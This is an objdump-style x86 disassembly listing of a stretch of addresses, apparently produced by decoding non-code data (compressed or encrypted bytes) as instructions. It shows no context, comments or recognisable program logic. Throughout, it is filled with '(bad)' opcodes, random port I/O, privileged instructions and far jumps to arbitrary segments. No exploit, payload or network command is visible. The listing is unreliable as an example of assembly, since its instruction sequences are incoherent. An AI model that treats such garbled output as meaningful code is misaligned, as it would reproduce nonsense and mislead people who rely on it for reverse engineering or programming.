  50d728:	adc    eax,DWORD PTR [ecx+0x5cece726]
  50d72e:	jbe    0x50d7ae
  50d730:	adc    al,0x2a
  50d732:	daa    
  50d733:	call   0xe1218c9e
  50d738:	int    0x4c
  50d73a:	push   ebx
  50d73b:	jns    0x50d7a3
  50d73d:	jp     0x50d760
  50d73f:	into   
  50d740:	aam    0x65
  50d742:	xlat   BYTE PTR ds:[ebx]
  50d743:	loopne 0x50d7b7
  50d745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50d746:	iret   
  50d747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d748:	sbb    al,0xf4
  50d74a:	pop    edi
  50d74b:	or     eax,0xbf4772dd
  50d750:	sub    ah,dl
  50d752:	add    BYTE PTR [eax-0x7531031c],0x43
  50d759:	neg    BYTE PTR [esi+0x42d9887c]
  50d75f:	pop    edx
  50d760:	out    0x34,al
  50d762:	sbb    eax,edi
  50d764:	lods   al,BYTE PTR ds:[esi]
  50d765:	aas    
  50d766:	fldcw  WORD PTR [ecx+0x2de86164]
  50d76c:	rol    DWORD PTR [edi-0x5842b699],0x24
  50d773:	cmp    edx,edx
  50d775:	mov    dh,0xfe
  50d777:	push   edi
  50d778:	mov    ds:0x164df978,al
  50d77d:	mov    WORD PTR [edx],?
  50d77f:	dec    eax
  50d780:	sbb    eax,0xef9f5a67
  50d785:	add    ecx,DWORD PTR [ecx]
  50d787:	or     edx,ebx
  50d789:	push   esi
  50d78a:	sbb    BYTE PTR [edx+esi*2-0x85bb833],bh
  50d791:	je     0x50d740
  50d793:	push   ss
  50d794:	ins    DWORD PTR es:[edi],dx
  50d795:	stc    
  50d796:	(bad)  
  50d797:	es popf 
  50d799:	fmul   DWORD PTR [ebp+0x1]
  50d79c:	call   0xa13a:0x257ef3d2
  50d7a3:	fild   WORD PTR [esi-0x499c9cd1]
  50d7a9:	not    ah
  50d7ab:	xchg   edx,eax
  50d7ac:	and    ebp,esp
  50d7ae:	mov    ebx,0x53aa933e
  50d7b3:	fimul  WORD PTR [eax-0x7d]
  50d7b6:	adc    esi,edi
  50d7b8:	(bad)  
  50d7b9:	int3   
  50d7ba:	and    eax,ebp
  50d7bc:	ins    DWORD PTR es:[edi],dx
  50d7bd:	mov    cl,0xa8
  50d7bf:	cli    
  50d7c0:	xlat   BYTE PTR ds:[ebx]
  50d7c1:	or     edx,esi
  50d7c3:	adc    bh,BYTE PTR [ebx]
  50d7c5:	daa    
  50d7c6:	enter  0xfad6,0x25
  50d7ca:	mov    al,0x24
  50d7cc:	mov    bl,0xd4
  50d7ce:	cwde   
  50d7cf:	aas    
  50d7d0:	adc    cl,BYTE PTR [edx-0x69]
  50d7d3:	mov    eax,ss
  50d7d5:	mov    ds:0xbd7b52ce,al
  50d7da:	mov    edi,0x32a76193
  50d7df:	inc    esi
  50d7e0:	or     eax,ebp
  50d7e2:	mov    esp,0x5d706e81
  50d7e7:	mov    ecx,0xf221f389
  50d7ec:	xor    al,0x47
  50d7ee:	call   0xe094:0x3d0bc1c3
  50d7f5:	xor    BYTE PTR [esp+ebx*8],bl
  50d7f8:	push   0x6611b618
  50d7fd:	retf   0xe6c5
  50d800:	cmp    WORD PTR [ebp+0x54],bx
  50d804:	retf   0x371
  50d807:	mov    eax,0x612ffd95
  50d80c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d80d:	cli    
  50d80e:	xchg   ecx,eax
  50d80f:	retf   
  50d810:	sti    
  50d811:	aad    0xc0
  50d813:	inc    esp
  50d814:	in     eax,0x48
  50d816:	jecxz  0x50d852
  50d818:	iret   
  50d819:	xchg   esi,eax
  50d81a:	mov    ch,0x7b
  50d81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50d81d:	xor    esi,esi
  50d81f:	dec    BYTE PTR [ebx]
  50d821:	outs   dx,DWORD PTR ds:[esi]
  50d822:	sbb    al,0x5f
  50d824:	pop    ebx
  50d825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50d826:	test   DWORD PTR [esi+0x6d21241b],esp
  50d82c:	pop    dx
  50d82e:	cmp    eax,0xd95b573d
  50d833:	mov    ds:0x613267fb,al
  50d838:	inc    ecx
  50d839:	and    bh,dh
  50d83b:	shl    BYTE PTR [eax+0x10fb16bb],1
  50d841:	mov    dl,bh
  50d843:	retf   0xd66c
  50d846:	sub    BYTE PTR [eax-0x47],0x11
  50d84a:	repnz push ss
  50d84c:	and    al,0xa5
  50d84e:	shr    DWORD PTR [edx+0x43],1
  50d851:	mov    edx,0x8cc08acb
  50d856:	inc    ebp
  50d857:	push   ss
  50d858:	pop    ebx
  50d859:	jl     0x50d8d8
  50d85b:	jmp    0x4fb86f26
  50d860:	push   edi
  50d861:	xor    bh,BYTE PTR [eax]
  50d863:	push   ebx
  50d864:	mov    eax,ds:0x4eb7000c
  50d869:	stos   DWORD PTR es:[edi],eax
  50d86a:	sub    al,0x49
  50d86c:	in     eax,0x8e
  50d86e:	mov    ebx,DWORD PTR [eax+ecx*1]
  50d871:	call   0xa67594d9
  50d876:	sbb    ecx,DWORD PTR [ebp-0x44]
  50d879:	push   ss
  50d87a:	sti    
  50d87b:	mov    bh,0x9b
  50d87d:	add    ebx,DWORD PTR [esi+0x6b]
  50d880:	les    esi,FWORD PTR [ecx+0x7c]
  50d883:	sahf   
  50d884:	dec    eax
  50d885:	rol    ah,cl
  50d887:	loop   0x50d826
  50d889:	retf   
  50d88a:	test   DWORD PTR [edx+0x3d278513],esp
  50d890:	ja     0x50d907
  50d892:	popf   
  50d893:	arpl   WORD PTR [edi],bx
  50d895:	out    dx,al
  50d896:	ins    DWORD PTR es:[edi],dx
  50d897:	mov    dh,BYTE PTR [esi]
  50d899:	cmp    DWORD PTR [ecx-0x78b5cbe3],ebx
  50d89f:	into   
  50d8a0:	add    al,0x70
  50d8a2:	cdq    
  50d8a3:	jb     0x50d87a
  50d8a5:	cdq    
  50d8a6:	adc    al,BYTE PTR [edx-0x282a16c5]
  50d8ac:	inc    ebx
  50d8ad:	sahf   
  50d8ae:	xchg   esi,eax
  50d8af:	loop   0x50d851
  50d8b1:	sub    eax,0x66a1bea3
  50d8b6:	mov    DWORD PTR [edi+0x47d5662d],esi
  50d8bc:	mov    ds:0x13f09ce8,eax
  50d8c1:	stc    
  50d8c2:	stos   BYTE PTR es:[edi],al
  50d8c3:	cvtps2pi mm3,QWORD PTR [ebx+0x75]
  50d8c7:	adc    ah,BYTE PTR [ecx-0x41]
  50d8ca:	pop    ebp
  50d8cb:	in     eax,dx
  50d8cc:	xor    esp,DWORD PTR [eax]
  50d8ce:	push   ds
  50d8cf:	mov    WORD PTR [ecx+0x3b],es
  50d8d2:	(bad)  
  50d8d3:	xchg   edi,eax
  50d8d4:	ret    
  50d8d5:	std    
  50d8d6:	test   eax,0xc74bb8fc
  50d8db:	or     ah,dh
  50d8dd:	dec    esp
  50d8de:	jmp    DWORD PTR [edx]
  50d8e0:	lods   eax,DWORD PTR ds:[esi]
  50d8e1:	test   DWORD PTR ss:[ecx+eax*8-0x1e172d7],esp
  50d8e9:	imul   DWORD PTR [edx+0x276b9ff5]
  50d8ef:	jns    0x50d930
  50d8f1:	xor    bh,al
  50d8f3:	jmp    0x27fe:0x3a663535
  50d8fa:	jecxz  0x50d94c
  50d8fc:	push   0x28
  50d8fe:	pop    es
  50d8ff:	or     ebx,DWORD PTR [edi-0xc]
  50d902:	adc    BYTE PTR [ebp-0x43],ah
  50d905:	outs   dx,DWORD PTR ds:[esi]
  50d906:	nop
  50d907:	gs loopne 0x50d94e
  50d90a:	mov    BYTE PTR [ecx-0x19],0x5b
  50d90e:	push   edi
  50d90f:	push   ebp
  50d910:	fwait
  50d911:	jecxz  0x50d8fd
  50d913:	(bad)  
  50d914:	sbb    eax,0x766bee3
  50d919:	mov    ecx,0x4e64a4e8
  50d91e:	clc    
  50d91f:	cs cwde 
  50d921:	retf   
  50d922:	icebp  
  50d923:	mov    ecx,0xcf79cf5f
  50d928:	mov    WORD PTR [edx],ds
  50d92a:	lock ret 
  50d92c:	adc    esi,DWORD PTR [eax]
  50d92e:	pop    eax
  50d92f:	mov    esp,ebp
  50d931:	adc    al,0x2b
  50d933:	loop   0x50d95b
  50d935:	(bad)  
  50d936:	outs   dx,BYTE PTR ds:[esi]
  50d937:	pop    ds
  50d938:	mul    BYTE PTR [esi]
  50d93a:	jb     0x50d93c
  50d93c:	dec    eax
  50d93d:	icebp  
  50d93e:	jno    0x50d8d5
  50d940:	add    al,0x89
  50d942:	stc    
  50d943:	jo     0x50d952
  50d945:	adc    BYTE PTR [ecx+0x4919350b],ch
  50d94b:	and    BYTE PTR [edx+0x6dd4992b],ch
  50d951:	aam    0xdb
  50d953:	je     0x50d982
  50d955:	fmul   QWORD PTR [edx-0x35]
  50d958:	popa   
  50d959:	js     0x50d99b
  50d95b:	leave  
  50d95c:	(bad)
  50d95f:	sets   dl
  50d962:	jge    0x50d953
  50d964:	or     ch,ah
  50d966:	pop    eax
  50d967:	mov    ah,BYTE PTR [edx]
  50d969:	adc    BYTE PTR [esi+0x15],bl
  50d96c:	push   ecx
  50d96d:	xchg   BYTE PTR [ebx+edx*8+0x4e8a0ac1],bl
  50d974:	or     ebx,esp
  50d976:	cmp    BYTE PTR [ebx-0x3f732f0f],bl
  50d97c:	in     al,dx
  50d97d:	lea    ebp,fs:[ebp+0x3249a603]
  50d984:	and    al,0x23
  50d986:	in     eax,dx
  50d987:	jp     0x50d9ec
  50d989:	ins    DWORD PTR es:[edi],dx
  50d98a:	sahf   
  50d98b:	fst    DWORD PTR [ecx-0x4e]
  50d98e:	mov    eax,ds:0x82cf6e04
  50d993:	ficom  WORD PTR [edi]
  50d995:	les    esp,FWORD PTR [esi]
  50d997:	paddsw mm5,mm3
  50d99a:	stos   DWORD PTR es:[edi],eax
  50d99b:	xor    eax,edi
  50d99d:	ins    BYTE PTR es:[edi],dx
  50d99e:	les    ebx,FWORD PTR [edi+0x69]
  50d9a1:	sbb    eax,0x80ebb0c3
  50d9a6:	push   ds
  50d9a7:	mov    edx,DWORD PTR [ebx+0x20d9f0e3]
  50d9ad:	lock and BYTE PTR [ecx-0x45],dh
  50d9b1:	lock add esi,ebx
  50d9b4:	mov    eax,0x33abd62b
  50d9b9:	mov    ch,0xd5
  50d9bb:	rcl    BYTE PTR [edx+edi*8-0x41c0251d],cl
  50d9c2:	cmp    eax,0x2a3d7a4e
  50d9c7:	sub    eax,0x9575559c
  50d9cc:	mov    ebx,0x6e0dd066
  50d9d1:	adc    al,0x39
  50d9d3:	cmp    BYTE PTR [ebp+0xfe615ff],cl
  50d9d9:	out    dx,al
  50d9da:	ins    DWORD PTR es:[edi],dx
  50d9db:	hlt    
  50d9dc:	mov    bl,0xc7
  50d9de:	sub    al,0x61
  50d9e0:	push   ss
  50d9e1:	mov    ecx,DWORD PTR [eax+eax*2-0x42]
  50d9e5:	call   0x797e4ced
  50d9ea:	fdivr  DWORD PTR [esi-0x46]
  50d9ed:	scas   eax,DWORD PTR es:[edi]
  50d9ee:	sahf   
  50d9ef:	xchg   ebx,eax
  50d9f0:	xchg   ebp,eax
  50d9f1:	sbb    al,0xc4
  50d9f3:	add    eax,ecx
  50d9f5:	jnp    0x50da22
  50d9f7:	xchg   BYTE PTR [esi-0x61160417],bl
  50d9fd:	sbb    bl,dl
  50d9ff:	push   edi
  50da00:	push   ebp
  50da01:	shr    BYTE PTR [edi-0x561cf74],0x6d
  50da08:	pusha  
  50da09:	in     eax,dx
  50da0a:	rol    BYTE PTR gs:[ecx],cl
  50da0d:	int    0x2d
  50da0f:	push   0x3d
  50da11:	add    BYTE PTR [ecx+0x5a],ch
  50da14:	or     BYTE PTR [edi],0x1b
  50da17:	popf   
  50da18:	xlat   BYTE PTR ds:[ebx]
  50da19:	xchg   ebx,eax
  50da1a:	neg    DWORD PTR [ecx]
  50da1c:	xor    eax,0x3987381c
  50da21:	(bad)  
  50da22:	enter  0xb233,0xf6
  50da26:	adc    eax,0x85492017
  50da2b:	cs inc esp
  50da2d:	dec    edi
  50da2e:	mov    bh,0x5f
  50da30:	mov    ch,0x90
  50da32:	dec    eax
  50da33:	mov    ebx,0x3025c185
  50da38:	or     al,0x63
  50da3a:	inc    esi
  50da3b:	push   eax
  50da3c:	push   0xa215b497
  50da41:	mov    ?,edx
  50da43:	inc    ebp
  50da44:	dec    esp
  50da45:	lahf   
  50da46:	pop    eax
  50da47:	in     al,0x4
  50da49:	sub    cl,al
  50da4b:	add    al,0xcd
  50da4d:	and    eax,0x6221ea21
  50da52:	mov    bh,0xc4
  50da54:	cdq    
  50da55:	adc    bl,BYTE PTR [ecx-0x63]
  50da58:	pop    ecx
  50da59:	fs jge 0x50da69
  50da5c:	dec    esi
  50da5d:	repnz add eax,0x7be24bd1
  50da63:	xchg   ecx,eax
  50da64:	jbe    0x50da4e
  50da66:	cmp    DWORD PTR [ebp-0x46b559bd],eax
  50da6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50da6d:	dec    eax
  50da6e:	aam    0x32
  50da70:	aad    0x3f
  50da72:	je     0x50daa3
  50da74:	out    0xd6,al
  50da76:	push   esi
  50da77:	(bad)
  50da7b:	pop    ecx
  50da7c:	cmc    
  50da7d:	jbe    0x50daad
  50da7f:	or     eax,0xfca5148e
  50da84:	test   eax,0x4b17ac9f
  50da89:	xor    BYTE PTR [ecx+0x37073283],ah
  50da8f:	jmp    DWORD PTR [edi]
  50da91:	add    bl,0x64
  50da94:	std    
  50da95:	ds pop esi
  50da97:	pop    ebp
  50da98:	ret    
  50da99:	add    al,BYTE PTR [ecx+0x4097aba1]
  50da9f:	sar    DWORD PTR [eax+esi*8+0x69],0xa
  50daa4:	sbb    eax,0xb0fe4544
  50daa9:	mov    bh,0x43
  50daab:	mov    ecx,0x7ec7d429
  50dab0:	push   edx
  50dab1:	ret    
  50dab2:	lahf   
  50dab3:	xchg   dl,dh
  50dab5:	dec    ecx
  50dab6:	sar    DWORD PTR [ebp+esi*8+0x30795242],0xea
  50dabe:	xchg   edi,eax
  50dabf:	(bad)  
  50dac0:	or     DWORD PTR [edi+0x533d33a5],ecx
  50dac6:	inc    esi
  50dac7:	xchg   edx,eax
  50dac8:	call   0xde9a1796
  50dacd:	cmp    ecx,DWORD PTR [ecx-0x57]
  50dad0:	pushf  
  50dad1:	retf   0x8a61
  50dad4:	outs   dx,BYTE PTR ds:[esi]
  50dad5:	mov    ah,0x69
  50dad7:	adc    al,0xf9
  50dad9:	addr16 lock bswap bp
  50dade:	cmp    eax,0xa5fb4ab7
  50dae3:	jl     0x50db11
  50dae5:	push   esp
  50dae6:	adc    cl,ch
  50dae8:	and    eax,0x49bc0254
  50daed:	in     al,dx
  50daee:	mov    eax,0x36c1d305
  50daf3:	rol    edx,1
  50daf5:	inc    esi
  50daf6:	(bad)  
  50daf7:	adc    eax,0xe334b68b
  50dafc:	adc    al,0x85
  50dafe:	out    0xbe,al
  50db00:	leave  
  50db01:	loopne 0x50daf6
  50db03:	and    ebx,DWORD PTR [eax]
  50db05:	jne    0x50db20
  50db07:	sbb    eax,0x2efe353
  50db0c:	pop    ebp
  50db0d:	adc    dh,cl
  50db0f:	sar    BYTE PTR [edi*4+0x196bab0],1
  50db16:	cmp    al,0x48
  50db18:	push   es
  50db19:	add    DWORD PTR [ebp-0x7],ebx
  50db1c:	outs   dx,BYTE PTR ds:[esi]
  50db1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50db1e:	sbb    al,0x92
  50db20:	imul   ecx,DWORD PTR [edx+0x5d],0x965bc038
  50db27:	xchg   ecx,eax
  50db28:	jae    0x50db28
  50db2a:	rol    BYTE PTR [eax-0x76],1
  50db2d:	mov    ah,0xd9
  50db2f:	test   al,bh
  50db31:	inc    ebx
  50db32:	arpl   WORD PTR [edx+0x76],bx
  50db35:	ret    0x5341
  50db38:	push   ebx
  50db39:	jns    0x50db45
  50db3b:	sar    BYTE PTR fs:[ecx],1
  50db3e:	pop    edi
  50db3f:	jmp    0x5a01:0xb783a77f
  50db46:	in     eax,dx
  50db47:	push   ss
  50db48:	loopne 0x50dae0
  50db4a:	mov    al,0x1
  50db4c:	ja     0x50db8e
  50db4e:	jecxz  0x50db9d
  50db50:	inc    esi
  50db51:	clc    
  50db52:	mov    dl,0x27
  50db54:	je     0x50db7e
  50db56:	call   ecx
  50db58:	cwde   
  50db59:	push   edi
  50db5a:	adc    al,BYTE PTR [ebx-0x4c79f885]
  50db60:	dec    ecx
  50db61:	pop    es
  50db62:	pop    esp
  50db63:	inc    esp
  50db64:	into   
  50db65:	and    al,0x60
  50db67:	into   
  50db68:	sti    
  50db69:	jmp    0x50db15
  50db6b:	jnp    0x50db62
  50db6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50db6e:	push   esp
  50db6f:	fisubr DWORD PTR [ebp+0x42]
  50db72:	or     edx,0xade2ac96
  50db78:	inc    edx
  50db79:	add    BYTE PTR [edx-0x16d6cc01],cl
  50db7f:	pushf  
  50db80:	js     0x50dbba
  50db82:	add    al,0xb4
  50db84:	int3   
  50db85:	repnz fld DWORD PTR ds:0x3cf99611
  50db8c:	adc    al,0x69
  50db8e:	mov    edi,0xa7d5d02f
  50db93:	mov    esp,0xb71d7137
  50db98:	or     al,0xaa
  50db9a:	adc    DWORD PTR [edx],edx
  50db9c:	xchg   esp,eax
  50db9d:	jne    0x50db2b
  50db9f:	hlt    
  50dba0:	jne    0x50dc21
  50dba2:	inc    ecx
  50dba3:	xchg   edx,eax
  50dba4:	pop    edx
  50dba5:	adc    BYTE PTR [eax-0x6d],bh
  50dba8:	xor    DWORD PTR [ebp+0x2f0af317],0xffffff8d
  50dbaf:	push   es
  50dbb0:	in     eax,0xc9
  50dbb2:	xchg   esp,eax
  50dbb3:	in     al,0xf7
  50dbb5:	jle    0x50db6d
  50dbb7:	push   cs
  50dbb8:	clc    
  50dbb9:	mov    ds:0x1cc1476a,al
  50dbbe:	pop    DWORD PTR [ecx-0x72a4811a]
  50dbc4:	inc    ebp
  50dbc5:	sub    DWORD PTR [eax+0x3e],0xffffffdb
  50dbc9:	in     al,0xac
  50dbcb:	cs out 0xa2,eax
  50dbce:	push   esp
  50dbcf:	popa   
  50dbd0:	add    DWORD PTR [esi+0x69],ebp
  50dbd3:	ja     0x50dbb8
  50dbd5:	xor    BYTE PTR [ebp+0x5c],ch
  50dbd8:	ja     0x50db5f
  50dbda:	sbb    ecx,DWORD PTR [ecx+0x537d7dcf]
  50dbe0:	pop    ecx
  50dbe1:	jno    0x50dc44
  50dbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50dbe4:	and    eax,DWORD PTR [edi-0x53de9a4b]
  50dbea:	mov    ecx,0x207189c0
  50dbef:	fnstcw WORD PTR [edi+0x4aa9f111]
  50dbf5:	dec    ebp
  50dbf6:	add    eax,0x71e1f58b
  50dbfb:	test   al,0x8c
  50dbfd:	outs   dx,BYTE PTR ds:[esi]
  50dbfe:	dec    esp
  50dbff:	fild   DWORD PTR [esi-0x4bcc6fc]
  50dc05:	ret    0x2c92
  50dc08:	fdivr  DWORD PTR [edi-0x4ba1d8f5]
  50dc0e:	adc    eax,0x4a81ade5
  50dc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  50dc14:	hlt    
  50dc15:	dec    esi
  50dc16:	fcmovnu st,st(6)
  50dc18:	pushf  
  50dc19:	sbb    eax,0x6e02c0bb
  50dc1e:	mov    ebp,0x58a2167e
  50dc23:	dec    edi
  50dc24:	cmovp  esp,edi
  50dc27:	int    0x65
  50dc29:	rol    BYTE PTR [esi-0x351d0a96],cl
  50dc2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  50dc30:	and    al,0x32
  50dc32:	scas   eax,DWORD PTR es:[edi]
  50dc33:	imul   edx,DWORD PTR [edi],0x1f
  50dc36:	popf   
  50dc37:	and    ebp,0x5651dc00
  50dc3d:	lock xor al,al
  50dc40:	and    BYTE PTR [ebp-0x22],bh
  50dc43:	mov    ecx,0x2f1f4efc
  50dc48:	and    ebp,eax
  50dc4a:	in     al,dx
  50dc4b:	mov    BYTE PTR [edx+0x34],bh
  50dc4e:	xchg   esi,eax
  50dc4f:	(bad)
  50dc53:	mov    WORD PTR ds:0x4a5d9954,ds
  50dc59:	pop    eax
  50dc5a:	add    eax,0xfbef637f
  50dc5f:	out    0xdf,eax
  50dc61:	xlat   BYTE PTR ds:[ebx]
  50dc62:	pusha  
  50dc63:	jle    0x50dc75
  50dc65:	lock adc eax,0x16365b91
  50dc6b:	and    ch,BYTE PTR [ebx]
  50dc6d:	inc    ecx
  50dc6e:	jge    0x50dc92
  50dc70:	push   edx
  50dc71:	add    BYTE PTR [edi-0x49],dl
  50dc74:	inc    edi
  50dc75:	shl    DWORD PTR [edi],0x68
  50dc78:	les    esp,FWORD PTR [ecx+0x50b29bb4]
  50dc7e:	jnp    0x50dc5a
  50dc80:	cs mov esp,0xd84c0279
  50dc86:	repnz sbb BYTE PTR [edx-0x44],bh
  50dc8a:	cmc    
  50dc8b:	jo     0x50dcdb
  50dc8d:	adc    al,0xd7
  50dc8f:	or     eax,0xe6291f0d
  50dc94:	inc    ebx
  50dc95:	sub    dl,BYTE PTR [eax+0x1df5f413]
  50dc9b:	xchg   edx,eax
  50dc9c:	dec    ebp
  50dc9d:	rcl    DWORD PTR [ebx],cl
  50dc9f:	fisttp QWORD PTR [edx]
  50dca1:	imul   ecx,DWORD PTR [edi],0xffffffd5
  50dca4:	retf   0x1fd1
  50dca7:	push   esp
  50dca8:	and    BYTE PTR gs:[edi-0x5cdedd92],al
  50dcaf:	fdivr  QWORD PTR [ebx+0x64]
  50dcb2:	mov    ebp,0xc8654886
  50dcb7:	es or  edi,ecx
  50dcba:	or     cl,BYTE PTR [ebx+0x56]
  50dcbd:	or     al,0x96
  50dcbf:	ja     0x50dd1a
  50dcc1:	cmp    eax,0x5f91f68
  50dcc6:	mul    ah
  50dcc8:	push   ebp
  50dcc9:	or     esp,DWORD PTR [edi]
  50dccb:	and    dh,bl
  50dccd:	push   DWORD PTR [eax+0x417f3ea9]
  50dcd3:	pop    ebp
  50dcd4:	jno    0x50dcf4
  50dcd6:	cmp    al,0x8e
  50dcd8:	jnp    0x50dd52
  50dcda:	push   ds
  50dcdb:	mov    edx,0x9a685360
  50dce0:	add    DWORD PTR [ebx+0x5a487254],eax
  50dce6:	ins    BYTE PTR es:[edi],dx
  50dce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  50dce8:	(bad)  
  50dce9:	sub    al,0xd3
  50dceb:	or     DWORD PTR ds:0xd222a341,ebp
  50dcf1:	xor    ebp,edx
  50dcf3:	sub    al,BYTE PTR [ebx+0xfe11e71]
  50dcf9:	rol    edi,1
  50dcfb:	out    dx,al
  50dcfc:	jl     0x50dd6f
  50dcfe:	push   ds
  50dcff:	and    al,BYTE PTR [eax]
  50dd01:	dec    si
  50dd03:	mov    al,ds:0xeb82033d
  50dd08:	arpl   WORD PTR [ecx+eiz*4-0x46],ax
  50dd0c:	sbb    BYTE PTR [ebx],bh
  50dd0e:	cmp    esi,edx
  50dd10:	rcl    al,1
  50dd12:	pop    ebx
  50dd13:	jecxz  0x50dd17
  50dd15:	cmp    eax,DWORD PTR [edi+ebp*2]
  50dd18:	clc    
  50dd19:	pusha  
  50dd1a:	popf   
  50dd1b:	mov    bl,0x8d
  50dd1d:	in     eax,dx
  50dd1e:	clc    
  50dd1f:	and    edx,DWORD PTR [ebx]
  50dd21:	mov    esp,0x3e3f718c
  50dd26:	out    dx,al
  50dd27:	mov    eax,0xb33c58a3
  50dd2c:	daa    
  50dd2d:	icebp  
  50dd2e:	loope  0x50dd12
  50dd30:	cld    
  50dd31:	mov    al,0x6c
  50dd33:	mov    ds:0xedf8230c,eax
  50dd38:	scas   al,BYTE PTR es:[edi]
  50dd39:	clc    
  50dd3a:	nop
  50dd3b:	in     eax,0xd6
  50dd3d:	jl     0x50ddb1
  50dd3f:	mov    esi,0xbb5c63cb
  50dd44:	sub    eax,0x27ba398f
  50dd49:	xchg   ebx,eax
  50dd4a:	es not ch
  50dd4d:	call   0x8e15:0xff41879c
  50dd54:	outs   dx,BYTE PTR ds:[esi]
  50dd55:	lahf   
  50dd56:	sub    BYTE PTR [ebx-0x68],dl
  50dd59:	imul   dh
  50dd5b:	mov    esp,0x381f8fbf
  50dd60:	outs   dx,DWORD PTR ds:[esi]
  50dd61:	and    BYTE PTR [ebp-0x6cb84ec6],bl
  50dd67:	xchg   ebp,eax
  50dd68:	or     eax,0x254f58c7
  50dd6d:	pop    es
  50dd6e:	hlt    
  50dd6f:	jb     0x50dd8b
  50dd71:	sti    
  50dd72:	xlat   BYTE PTR ds:[ebx]
  50dd73:	fild   WORD PTR ss:[ecx]
  50dd76:	mov    al,ds:0x654ad504
  50dd7b:	outs   dx,DWORD PTR ds:[esi]
  50dd7c:	fimul  DWORD PTR [ebp-0x6d]
  50dd7f:	test   al,0x76
  50dd81:	std    
  50dd82:	xchg   ebx,eax
  50dd83:	pushf  
  50dd84:	jns    0x50dd08
  50dd86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  50dd87:	and    BYTE PTR [esi-0xb],0x3c
  50dd8b:	rcl    DWORD PTR [esi+0x21],0x24
  50dd8f:	scas   eax,DWORD PTR es:[edi]
  50dd90:	mov    bl,0x3b
  50dd92:	add    BYTE PTR [esi-0x22],dh
  50dd95:	test   BYTE PTR [ecx],cl
  50dd97:	sub    edi,DWORD PTR [eax+ecx*8-0x2b]
  50dd9b:	adc    BYTE PTR [esi+0x77],0x13
  50dd9f:	mov    esi,0x8286b67
  50dda4:	add    DWORD PTR [ebp-0x52],eax
  50dda7:	sub    dl,BYTE PTR [ecx]
  50dda9:	cli    
  50ddaa:	xchg   edi,eax
  50ddab:	into   
  50ddac:	sub    eax,0xc16b177b
  50ddb1:	sar    BYTE PTR [ebx+0xe3fdfc1],0x70
  50ddb8:	push   0x2b3e4026
  50ddbd:	pop    ebp
  50ddbe:	mov    edx,0xf293abca
  50ddc3:	mov    esp,0xa8c6cee0
  50ddc8:	sar    BYTE PTR [edi-0x15],cl
  50ddcb:	mov    dh,dl
  50ddcd:	cdq    
  50ddce:	dec    esp
  50ddcf:	xchg   ebp,eax
  50ddd0:	jns    0x50dd82
  50ddd2:	jbe    0x50dd92
  50ddd4:	jns    0x50de2e
  50ddd6:	out    0xe6,al
  50ddd8:	xchg   ebx,eax
  50ddd9:	inc    ecx
  50ddda:	mov    ch,0xf2
  50dddc:	or     al,0x70
  50ddde:	and    eax,0x1156d4b7
  50dde3:	mov    dl,0xab
  50dde5:	mov    al,0x45
  50dde7:	pop    ebx
  50dde8:	adc    al,0x49
  50ddea:	push   ebx
  50ddeb:	shl    DWORD PTR [esi-0x6a],0x3c
  50ddef:	hlt    
  50ddf0:	add    eax,0x21ae15a2
  50ddf5:	dec    ebx
  50ddf6:	shr    BYTE PTR [eax+0x6af53279],cl
  50ddfc:	mov    bl,0x1f
  50ddfe:	sbb    eax,0xe8077dc6
  50de03:	ja     0x50ddcd
  50de05:	(bad)  
  50de06:	stc    
  50de07:	xchg   esp,eax
  50de08:	jno    0x50ddc4
  50de0a:	dec    eax
  50de0b:	sub    eax,0x97fe2ee4
  50de10:	sbb    edi,DWORD PTR [edx+0x2924cd02]
  50de16:	in     al,dx
  50de17:	hlt    
  50de18:	push   cs
  50de19:	imul   esp,DWORD PTR [edi],0xd054c862
  50de1f:	add    BYTE PTR ds:0x879c03e0,bh
  50de25:	add    ebx,DWORD PTR [edx+0x2a]
  50de28:	(bad)  
  50de29:	gs mov ecx,0xa6e2caae
  50de2f:	and    eax,DWORD PTR [ecx+0x64c8daed]
  50de35:	retf   
  50de36:	mov    ds:0xf9754c8f,eax
  50de3b:	(bad)  
  50de3c:	in     al,dx
  50de3d:	test   eax,0xc72e811a
  50de42:	jecxz  0x50de98
  50de44:	enter  0xbd78,0x9
  50de48:	test   BYTE PTR [edi+0x53],dl
  50de4b:	lea    ecx,[edi]
  50de4d:	sub    DWORD PTR [ebp+0x12],edx
  50de50:	jb     0x50de92
  50de52:	cmp    BYTE PTR [eax+0xc89b2c6],0x5f
  50de59:	xchg   edi,eax
  50de5a:	imul   esp,DWORD PTR [edi-0x3f035121],0x49
  50de61:	inc    ebx
  50de62:	cmp    BYTE PTR [edx],0x6
  50de65:	xchg   ebp,eax
  50de66:	sbb    BYTE PTR [ebp-0x12],al
  50de69:	dec    edx
  50de6a:	inc    esp
  50de6b:	pop    esp
  50de6c:	and    DWORD PTR [esi],esp
  50de6e:	data16 std 
  50de70:	or     al,0xa8
  50de72:	pop    ds
  50de73:	inc    esi
  50de74:	add    edx,DWORD PTR [eax-0x23]
  50de77:	add    bh,BYTE PTR [eax-0x1783751]
  50de7d:	int3   
  50de7e:	popf   
  50de7f:	sub    DWORD PTR [eax+ebp*1],esi
  50de82:	pop    esp
  50de84:	sar    ah,cl
  50de86:	xchg   esi,eax
  50de87:	add    bh,BYTE PTR [eax+0x21132f34]
  50de8d:	js     0x50de34
  50de8f:	xlat   BYTE PTR ds:[ebx]
  50de90:	scas   al,BYTE PTR es:[edi]
  50de91:	das    
  50de92:	dec    eax
  50de93:	fld    QWORD PTR [eax]
  50de95:	mov    edx,0x18761254
  50de9a:	fidiv  DWORD PTR [edi+0x5c]
  50de9d:	sbb    BYTE PTR [edi],al
  50de9f:	and    eax,0x48f70ac0
  50dea4:	adc    eax,0xe14717
  50dea9:	xchg   ecx,eax
  50deaa:	inc    ebx
  50deab:	lock mov edi,0xf719e1f4
